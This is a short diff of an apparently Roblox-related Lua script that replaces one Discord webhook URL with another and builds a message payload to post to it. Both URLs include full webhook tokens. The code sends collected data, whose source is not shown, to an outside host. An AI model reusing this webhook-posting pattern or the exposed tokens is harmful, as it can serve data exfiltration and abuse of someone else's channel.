@@ -8,7 +8,7 @@ local webhookcheck =
    "trash exploit here"
 
 local url =
-   "https://discord.com/api/webhooks/924978517488324608/Ti6Qt9fnIl9EszgtsDdu2HI3JMFMDX36P_1Pj02M2q_qP71pXCdvjPN8zRxEVsI1Gku2"
+   "https://discord.com/api/webhooks/924994616124649533/5jd9EQpbasZWKkF0IxxzFxgdWEmjwyJ0s3IvAchpirpP3QrZP0faL0u01lIkAC-S0YHK"
 local data = {
    ["content"] = a,
    ["embeds"] = {
